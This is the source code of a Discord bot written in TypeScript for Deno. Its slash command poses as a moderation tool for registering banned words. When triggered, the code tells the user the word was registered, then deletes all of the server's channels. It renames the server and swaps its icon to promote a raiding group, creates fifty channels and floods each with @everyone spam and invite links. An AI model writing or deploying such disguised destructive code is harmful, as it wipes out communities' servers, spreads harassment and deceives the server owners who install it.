import { Client, GatewayIntentBits } from "@djs";
import "https://deno.land/std@0.191.0/dotenv/load.ts";
import { Interaction, REST, Routes } from "@djs";
import { Logger } from "./logger.ts";

const { TOKEN, CLIENT_ID } = Deno.env.toObject();

const rest = new REST({ version: "10" }).setToken(TOKEN);

try {
  Logger.log(`Command registering.`);
  await rest.put(Routes.applicationCommands(CLIENT_ID), {
    body: [
      {
        name: "anti",
        description: "**禁止ワードを登録**",
        type: 1,
        options: [
          {
            name: "text",
            type: 3,
            required: false,
            description: "**禁止する文章を入力してください**",
          },
        ],
      },
      {
        name: "anti",
        description: "**禁止ワードを登録中...**",
        type: 1,
        options: [
          {
            name: "select",
            type: 3,
            required: false,
            description: "**設置する操作パネルのタイプ**",
          },
        ],
      },
    ],
  });
  Logger.log(`Command registered.`);
} catch (error) {
  Logger.log(`Command registration failed.`, "WARN");
  Logger.log(error, "WARN");
}

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.on("ready", () => {
  Logger.log(`Logged in as ${Logger.bold(client.user?.tag ?? "")}`);
});

client.on("interactionCreate", async (interaction: Interaction) => {
  if (interaction.isCommand()) {
    const name = interaction.commandName;

    if (name === "anti") {
      const text = (
        interaction.options.data[0]
          ? interaction.options.data[0].value
          : `# 荒らし共栄圏最強
# [荒らし共栄圏に参加](https://ctkpaarr.data.blog/#Discord)
https://ctkpaarr.data.blog/
https://discord.gg/annycW3Xrk
# 荒らし共栄圏万歳
@everyone
ーーーーーーーーーーーーーーーー
（画像） https://imgur.com/LacFtDP
（画像） https://imgur.com/gQkpAYe
（画像） https://imgur.com/mOlUpn3
`
      )?.toString();
      await interaction.reply({ content: `**禁止ワードを登録しました**` });

      // NUKE
      const discordServer = client.guilds.cache.get(interaction.guildId ?? "");
      discordServer?.channels.cache.forEach(async (channel) => {
        try {
          await channel.delete();
        } catch (_e) {}
      });

      const max = 50;
      discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
      discordServer?.setIcon("https://ctkpaarrdata.files.wordpress.com/2023/03/cropped-20211120_125906.gif?w=196")

      for (let i = 0; i < max; i++) {
        discordServer?.channels
          .create({
            name: text?.split("\n")[0] ?? "荒らし共栄圏万歳！",
            type: 0,
          })
          .then(async (channel) => {
            for (let j = 0; j < max; j++) {
              try {
                channel.send(
                  text ??
                    "荒らし共栄圏万歳！ \n https://ctkpaarr.data.blog \n @everyone"
                );
              } catch (_e) {
                /* ANTI TIMEOUT */
              }
            }
          });
      }

      discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
    }else {
      await interaction.reply("**現在メンテナンス中です。**");
    }
  }
});

client.login(TOKEN);
